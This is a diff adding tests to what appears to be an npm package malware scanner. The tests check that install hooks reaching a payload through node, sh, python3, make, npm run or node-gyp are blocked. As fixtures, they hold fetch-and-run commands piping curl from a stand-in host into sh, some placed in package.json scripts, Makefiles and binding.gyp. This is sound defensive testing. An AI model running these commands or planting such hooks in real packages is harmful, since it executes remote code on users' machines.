@@ -65,6 +65,76 @@ with tempfile.TemporaryDirectory() as d:
     v = se.scan_files(list(Path(d).rglob("*")) + out, f)
     assert v.verdict == "BLOCK" and any(e["file"] == "package.json#postinstall.js" for e in f.evidence), f.evidence
 
+# ---- what the install scripts run is followed as npm and the shell would run it (review 2026-10-30: each was ALLOW)
+import io  # noqa: E402
+import tarfile  # noqa: E402
+
+PAYLOAD_JS = "require('child_process').execSync('curl https://evil.example/x | sh')\n"
+PAYLOAD_SH = "curl https://evil.example/x | sh\n"
+GYP = json.dumps({"targets": [{"target_name": "a", "sources": ["<!(curl -s https://evil.example/x | sh)"]}]})
+
+
+def tarball(members: dict) -> bytes:
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
+        for name, text in members.items():
+            data = text.encode()
+            info = tarfile.TarInfo("package/" + name)
+            info.size = len(data)
+            tf.addfile(info, io.BytesIO(data))
+    return buf.getvalue()
+
+
+def scan_tarball(members: dict) -> str:
+    """The verdict of a tarball scanned like scan_npm_package: npm.extract, install_time_files, write_lifecycle."""
+    with tempfile.TemporaryDirectory() as t:
+        root = Path(t, "x-1.0.0.tgz.unpacked")
+        root.mkdir()
+        files = npm.extract(tarball(members), root, [])
+        f = se.ScanFeatures(name="x", version="1.0.0", ecosystem="npm")
+        f.install_time_files = npm.install_time_files(files)
+        return se.scan_files(files + npm.write_lifecycle(files, Path(t), "x-1.0.0"), f).verdict
+
+
+def pj(scripts, **kw):
+    return json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts, **kw})
+
+
+for label, members in {
+        "node X without extension, in test/": {"package.json": pj({"postinstall": "node test/setup"}), "test/setup.js": PAYLOAD_JS},
+        "node . runs main": {"package.json": pj({"postinstall": "node ."}, main="docs/i.js"), "docs/i.js": PAYLOAD_JS},
+        "node -r preloads a file": {"package.json": pj({"postinstall": "node -r ./test/h -e 1"}), "test/h.js": PAYLOAD_JS},
+        "node --import": {"package.json": pj({"install": "node --import=./lib/h.mjs x.js"}), "lib/h.mjs": PAYLOAD_JS, "x.js": ""},
+        "sh with a file without extension": {"package.json": pj({"postinstall": "sh setup"}), "setup": PAYLOAD_SH},
+        "python3 with any extension": {"package.json": pj({"postinstall": "python3 setup.cfg"}),
+                                       "setup.cfg": "import os\nos.system('curl https://evil.example/x | sh')\n"},
+        "./configure": {"package.json": pj({"preinstall": "./configure"}), "configure": PAYLOAD_SH},
+        "make runs the Makefile": {"package.json": pj({"preinstall": "make"}), "Makefile": "all:\n\t@" + PAYLOAD_SH},
+        "npm run follows the script": {"package.json": pj({"postinstall": "npm run build", "build": PAYLOAD_SH.strip()})},
+        "yarn <script> and pre-hooks": {"package.json": pj({"install": "yarn build", "prebuild": PAYLOAD_SH.strip(), "build": "tsc"})},
+        "node-gyp rebuild reads binding.gyp": {"package.json": pj({"install": "node-gyp rebuild"}), "binding.gyp": GYP},
+        "binding.gyp without install script": {"package.json": pj({}), "binding.gyp": GYP},
+        ".gypi included by the gyp file": {"package.json": pj({}), "binding.gyp": json.dumps({"includes": ["c.gypi"]}),
+                                           "c.gypi": GYP},
+}.items():
+    assert scan_tarball(members) == "BLOCK", label
+for label, members in {
+        "node scripts/setup": {"package.json": pj({"postinstall": "node scripts/setup"}), "scripts/setup.js": "console.log(1)\n"},
+        "node-gyp with node -p expansion": {"package.json": pj({"install": "node-gyp rebuild"}), "binding.gyp": json.dumps(
+            {"targets": [{"target_name": "a", "include_dirs": ["<!(node -p \"require('node-addon-api').include\")"]}]})},
+        "binding.gyp with an install script that is not node-gyp": {"package.json": pj({"install": "echo prebuilt"}), "binding.gyp": GYP},
+        "make with a build recipe": {"package.json": pj({"preinstall": "make"}), "Makefile": "all:\n\t@echo build\n\tcc -o a a.c\n"},
+        "test script is not run at install": {"package.json": pj({"test": "sh setup"}), "setup": PAYLOAD_SH},
+}.items():
+    assert scan_tarball(members) == "ALLOW", label
+# a script name is the package's: it never becomes a path outside the scan folder
+with tempfile.TemporaryDirectory() as d:
+    root = Path(d, "x-1.0.0.tgz.unpacked", "package")
+    root.mkdir(parents=True)
+    (root / "package.json").write_text(pj({"postinstall": "npm run ../../../../escape", "../../../../escape": "true"}))
+    out = npm.write_lifecycle(list(Path(d).rglob("*")), Path(d), "x-1.0.0")
+    assert out and all(f.parent == Path(d, "x-1.0.0.scripts.unpacked") for f in out), out
+
 # ---- the guard decision with a fake registry scan: BLOCK refuses, ALLOW passes, a malicious lock entry blocks
 import guard_core  # noqa: E402
 
